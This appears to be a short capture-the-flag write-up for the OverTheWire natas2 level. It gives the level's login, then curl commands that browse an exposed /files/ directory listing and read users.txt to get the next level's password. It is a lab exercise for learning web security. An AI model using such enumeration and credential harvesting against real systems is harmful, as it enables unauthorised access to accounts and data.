---
date: '2026-02-15'
description: exploring directory traversal
draft: false
title: natas-2
weight: 3
ShowToc: false
---

| info | value |
|:-----|------:|
| user | `natas2` |
| pass | `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI` |
| host | `http://natas2.natas.labs.overthewire.org` |

### explanation

it may seem like there's nothing important at first glance besides 'there is nothing on this page', but we can find a linked ressource within the source code

```html
<img src="files/pixel.png">
```

why not check out if we can traverse through the domain's structure?

```sh
curl http://natas2.natas.overthewire.org/files/ \
-u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

make sure to append a slash `/` to the `files/` directory, otherwise curl would try to access the
`files` file, which in this case doesn't exist. the output may look a bit scuffed, but carefully
reading through we can find a unix-like file structure containing 3 links
```html
<a href="/">Parent Directory</a>    <!-- navigating to the parent dir -->
<a href="pixel.png">pixel.png</a>   <!-- the ressource found on the document  prior -->
<a href="users.txt">users.txt</a>   <!-- users dir, which could contain useful info -->
```

furthermore, we can find a `users.txt` within containing a list of users with luckily the next user's password

```sh
curl http://natas2.natas.overthewire.org/files/users.txt \
-u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

yields

```sh
# username:password
...
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
...
```

